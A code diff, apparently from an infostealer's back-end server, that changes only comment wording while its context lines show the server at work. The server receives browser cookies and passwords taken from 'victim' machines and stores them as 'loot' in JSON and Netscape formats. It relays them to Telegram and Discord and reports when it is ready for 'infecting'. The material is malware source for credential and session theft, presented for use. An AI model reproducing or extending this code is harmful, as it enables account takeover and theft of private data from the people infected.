@@ -30,13 +30,13 @@ HERE   = os.path.dirname(os.path.abspath(__file__))
 LOOT   = os.path.join(HERE, "loot")
 os.makedirs(LOOT, exist_ok=True)
 
-# Output files — separated by type:
-#   all_cookies.json   — actual browser cookies only (no passwords)
-#   all_cookies.txt    — Netscape format of the above
-#   passwords.json     — extracted passwords with _username field
-#   passwords.txt      — readable text: domain | username | password
-#   session_cookies.json  — session-only cookies (expirationDate == 0, no passwords)
-#   session_cookies.txt   — Netscape format of the above
+# Output files -- separated by type:
+#   all_cookies.json -- actual browser cookies only (no passwords)
+#   all_cookies.txt -- Netscape format of the above
+#   passwords.json -- extracted passwords with _username field
+#   passwords.txt -- readable text: domain | username | password
+#   session_cookies.json -- session-only cookies (expirationDate == 0, no passwords)
+#   session_cookies.txt -- Netscape format of the above
 JSONF       = os.path.join(LOOT, "all_cookies.json")
 TXTF        = os.path.join(LOOT, "all_cookies.txt")
 PWD_JSONF   = os.path.join(LOOT, "passwords.json")
@@ -44,11 +44,11 @@ PWD_TXTF    = os.path.join(LOOT, "passwords.txt")
 SESS_JSONF  = os.path.join(LOOT, "session_cookies.json")
 SESS_TXTF   = os.path.join(LOOT, "session_cookies.txt")
 
-# Parse args: port, --bind addr, --tls-cert PEM, --tls-key PEM, --telegram token:chat, --discord webhook
+# Parse args: port, --bind addr, --tls-cert PEM, --tls-key PEM, --telegram token:chat, --discord webhook.
 PORT = 8080
 BIND = "0.0.0.0"
 TELEGRAM = None  # "bot_token:chat_id"
-DISCORD = None  # webhook URL
+DISCORD = None  # Webhook URL
 TLS_CERT = None
 TLS_KEY = None
 
@@ -93,7 +93,7 @@ class HTTPServerV4(socketserver.ThreadingMixIn, HTTPServer):
         """Override to skip socket.getfqdn() — it does a reverse DNS lookup on the
         bind address (0.0.0.0) which takes 4+ seconds on Windows, delaying listen()
         and causing the payload's HTTP connect to fail with WSAECONNREFUSED (10061)."""
-        # TCPServer.server_bind does: setsockopt + bind + getsockname (no DNS)
+        # TCPServer.server_bind does: setsockopt + bind + getsockname (no DNS).
         socketserver.TCPServer.server_bind(self)
         host, port = self.server_address[:2]
         self.server_name = socket.gethostname()  # local, no network lookup
@@ -146,7 +146,7 @@ def merge(old, new):
     return lootlib.merge(old, new, replace=True)
 
 
-# ------------------------------------------------------------------ relay channels
+# ------------------------------------------------------------------ Relay channels
 
 def telegram_preflight(token):
     """getMe once at startup. A revoked/placeholder key is dropped here instead of
@@ -268,7 +268,7 @@ class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         """Serve cookie files: /all (json), /passwords (json), /session (json), / (summary)"""
         if self.path == "/health":
-            # used by auto.py to prove ingest is alive before infecting
+            # Used by auto.py to prove ingest is alive before infecting.
             rows = load_existing()
             data = json.dumps({"ok": True, "records": len(rows),
                                "passwords": len(load_json(PWD_JSONF)),
@@ -390,7 +390,7 @@ class Handler(BaseHTTPRequestHandler):
         for c in cookies:
             c["_host"] = victim
 
-        # merge with existing collection
+        # Merge with existing collection
         old = load_existing()
         alls = merge(old, cookies)
 
@@ -399,7 +399,7 @@ class Handler(BaseHTTPRequestHandler):
         passwords   = filter_passwords(alls)
         sess_all    = filter_session(all_cookies)
 
-        # Write all cookies (no passwords)
+        # Write all cookies (no passwords).
         write_json(all_cookies)
         write_txt(all_cookies)
 
@@ -413,7 +413,7 @@ class Handler(BaseHTTPRequestHandler):
         with open(PWD_TXTF, "w", encoding="utf-8") as f:
             f.write("\n".join(pwd_lines) + "\n")
 
-        # Write session-only cookies (no passwords)
+        # Write session-only cookies (no passwords).
         with open(SESS_JSONF, "w", encoding="utf-8") as f:
             json.dump(sess_all, f, ensure_ascii=False, indent=1)
         sess_lines = ["# Netscape HTTP Cookie File (session only)"]
@@ -453,7 +453,7 @@ class Handler(BaseHTTPRequestHandler):
         for d, n in sorted(top.items(), key=lambda kv: -kv[1])[:15]:
             print("      %5d  %s" % (n, d))
 
-        # relay to Telegram / Discord (if configured)
+        # Relay to Telegram / Discord (if configured).
         relay_telegram(cookies)
         relay_discord(cookies)
 
@@ -463,7 +463,7 @@ class Handler(BaseHTTPRequestHandler):
         self.wfile.write(b"ok")
 
     def log_message(self, fmt, *args):
-        pass  # silent (we use our own prints above)
+        pass  # Silent (we use our own prints above)
 
 
 def main():
